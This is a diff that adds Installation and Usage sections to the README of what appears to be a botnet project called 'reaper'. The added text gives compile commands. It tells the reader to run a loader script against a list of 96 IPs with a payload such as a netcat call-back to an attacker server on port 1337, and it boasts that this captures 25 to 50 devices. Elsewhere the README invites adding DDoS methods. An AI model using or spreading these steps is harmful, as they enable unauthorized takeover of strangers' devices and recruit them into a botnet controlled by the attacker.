@@ -30,6 +30,18 @@ Extra Facts:
 - No, this does not contain any DDoS methods, If you want to customize this and add your own, then you are free to do so.
 ```
 
+## Installation
+```
+gcc -o reaper reaper.c -lpthread -lcurl
+gcc -o client client.c
+```
+
+## Usage
+After you have authenticated and are waiting for connections, run this command -> `python3 loader.py droid.txt`. Make sure you have edited in your payload in the loader script. (It can be something as simple as `nc <serverip> 1337`) Wait around 5-15 minutes, and you should have devices connected. Even though the custom list I made is small and only has 96 IP's, on average, it pulls around 25 - 50 devices.
+```
+
+```
+
 ## Screenshots
 ![Screenshot_2021-08-21-05-36-18_922x559](https://user-images.githubusercontent.com/86132648/130317740-f9882527-6632-4529-b776-dd224e7bc6ef.png)
 ![Screenshot_2021-08-18-06-41-40_893x237](https://user-images.githubusercontent.com/86132648/130317747-3e312623-450b-4a04-8bad-a9ebe8247491.png)
